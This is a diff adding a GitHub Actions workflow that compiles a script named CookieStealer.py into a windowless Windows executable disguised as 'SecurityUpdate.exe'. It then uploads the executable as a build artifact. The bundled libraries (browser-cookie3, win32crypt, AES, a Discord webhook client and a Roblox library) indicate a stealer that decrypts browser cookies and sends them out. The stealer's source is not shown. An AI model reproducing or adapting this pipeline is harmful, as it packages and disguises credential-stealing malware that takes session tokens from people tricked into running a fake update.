@@ -1,0 +1,36 @@
+name: Build Windows Executable
+
+on:
+  push:
+    branches: [ main, master ]
+  pull_request:
+    branches: [ main, master ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: windows-latest
+
+    steps:
+    - uses: actions/checkout@v4
+
+    - name: Set up Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.11'
+
+    - name: Install dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install nuitka ordered-set browser-cookie3 pycryptodome pywin32 discordwebhook httpx requests robloxpy
+
+    - name: Build executable with Nuitka
+      run: |
+        python -m nuitka --standalone --onefile --windows-disable-console --remove-output --output-filename=SecurityUpdate.exe --windows-icon-from-ico=icon32.ico --include-module=win32crypt --include-module=Crypto.Cipher.AES --include-module=browser_cookie3 --include-module=discordwebhook --include-module=robloxpy --include-module=httpx --include-module=requests --include-module=sqlite3 --include-module=json --include-module=base64 --python-flag=O --python-flag=-S CookieStealer.py
+
+    - name: Upload executable
+      uses: actions/upload-artifact@v4
+      with:
+        name: SecurityUpdate-Windows-Executable
+        path: SecurityUpdate.exe
+        retention-days: 30
